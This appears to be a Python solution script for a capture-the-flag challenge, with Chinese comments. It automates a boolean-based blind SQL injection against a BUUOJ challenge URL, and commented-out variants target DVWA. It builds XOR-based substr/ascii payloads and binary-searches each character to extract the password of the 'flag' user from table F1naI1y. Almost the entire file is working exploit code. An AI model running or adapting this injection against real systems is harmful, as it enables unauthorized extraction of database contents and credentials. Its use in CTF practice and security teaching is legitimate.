import requests
import time

# url是随时更新的，具体的以做题时候的为准

# 登录dvwa的header:
# headers = {'Cookie':'security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7',
#            'Referer':'http://localhost/DVWA/vulnerabilities/sqli_blind/'
#            }

# 当前注入点的url传输格式:
# ?id=1'+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23

url = 'http://3a13389a-3351-48c0-8cea-54afeb5a9e12.node5.buuoj.cn:81/search.php?id='

# database_name存储数据库名字
database_name = "geek"
# table_name存储指定表的名字
table_name = "F1naI1y"
# col_name存储指定字段的名字
col_name = "password"
# col_data_num存储有多少列
# 手动指定要查看多少列数据，由于合在一起显示所以只有一列
col_data_num = 1
# col_data_charnum存储每个字段数据的字符个数
# 手动指定要查看多少字符数据
col_data_charnum = 50

rank_index = 0
# 先遍历该字段有多少列
while (rank_index < col_data_num):
    rank_data_index = 0
    # data用来字段该列的数据
    data = ""
    while (rank_data_index < col_data_charnum):
        # 用二分法对当前字段进行猜解
        # 从可打印字符开始
        begin = 32
        end = 126
        tmp = (begin + end) // 2
        # 对第n个字符进行判断
        while (begin < end):
            # 根据当前网页url传输格式构造payload
            # payload1:用于普通盲注
            # payload1 = "1'+and+ascii(substr((select+{}+from+{}.{}+limit+{}%2C1)%2C{}%2C1))>{}+%23".format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)
            # payload2 = "1^(ascii(substr((select(GROUP_CONCAT({}))from({})),{},1))>{})".format(col_name, table_name, rank_data_index+1, tmp)
            payload3 = "1^(ascii(substr((select(password)from({})where(username='flag')),{},1))>{})".format(table_name, rank_data_index+1, tmp)
            # print(table_name[table_index], col_index, col_len_index, tmp)
            # 构造url请求,并存储返回的网页响应结果
            # str = "&Submit=Submit#" # 用于补全网页的url
            # print(url + payload1 + str)
            r = requests.get(url + payload3)
            time.sleep(0.1)
            # 判断该payload所返回的网页是true界面还是false界面
            true_text = "ERROR"
            # print(r.text)
            if (true_text in r.text):
                # 返回true界面 
                # print("true")
                begin = tmp + 1
                tmp = (begin + end) // 2
            else:
                # 返回flase界面
                end = tmp
                tmp = (begin + end) // 2
        # 最终begin==end,而此时的tmp就是该字符的ascii码
        # print(tmp)
        data = data + chr(tmp)
        # 继续下一个字符
        rank_data_index = rank_data_index + 1
    # 继续下一列
    print("{}字段第{}列的值:{}".format(col_name, rank_index + 1, data))
    rank_index = rank_index + 1

